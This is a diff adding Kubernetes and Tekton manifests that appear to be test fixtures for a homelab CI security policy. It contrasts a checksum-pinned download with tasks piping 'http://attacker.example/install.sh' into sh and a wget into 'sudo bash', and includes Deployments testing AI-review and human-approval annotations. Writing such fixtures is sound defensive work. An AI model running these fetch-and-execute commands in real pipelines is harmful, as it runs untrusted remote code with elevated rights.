@@ -353,3 +353,80 @@ data:
   credentials: '{"storageSpecSecretName": "storage-config"}'
   require-git-ssh-secret-known-hosts: "false"
 
+---
+apiVersion: tekton.dev/v1
+kind: Task
+metadata:
+  name: ci-task-pinned-tools
+  namespace: homelab-ci
+spec:
+  steps:
+    - name: install
+      image: registry.access.redhat.com/ubi9/ubi-minimal:9.6
+      script: |
+        curl -fsSLo /tmp/tool.tar.gz https://example.com/tool-1.2.3.tar.gz
+        echo "abc123  /tmp/tool.tar.gz" | sha256sum -c -
+---
+apiVersion: tekton.dev/v1
+kind: Task
+metadata:
+  name: ci-task-curl-pipe-sh
+  namespace: homelab-ci
+spec:
+  steps:
+    - name: bootstrap-tools
+      image: registry.access.redhat.com/ubi9/ubi-minimal:9.6
+      script: curl -fsSL http://attacker.example/install.sh | sh
+---
+apiVersion: tekton.dev/v1
+kind: Pipeline
+metadata:
+  name: ci-pipeline-embedded-wget-bash
+  namespace: homelab-ci
+spec:
+  tasks:
+    - name: build
+      taskSpec:
+        steps:
+          - name: setup
+            image: registry.access.redhat.com/ubi9/ubi-minimal:9.6
+            script: |
+              set -e
+              wget -qO- https://get.example.com | sudo bash
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: deployment-ai-and-human-approved
+  namespace: apps
+  annotations:
+    security.labjp.xyz/ai-reviewed: blue-reviewer
+    security.labjp.xyz/human-approved: "true"
+spec:
+  selector:
+    matchLabels: {app: web}
+  template:
+    metadata:
+      labels: {app: web}
+    spec:
+      containers:
+        - name: web
+          image: ghcr.io/labjp-homelab/web:1.0.0
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: deployment-ai-approved-only
+  namespace: apps
+  annotations:
+    security.labjp.xyz/ai-reviewed: blue-reviewer
+spec:
+  selector:
+    matchLabels: {app: web}
+  template:
+    metadata:
+      labels: {app: web}
+    spec:
+      containers:
+        - name: web
+          image: ghcr.io/labjp-homelab/web:1.0.0
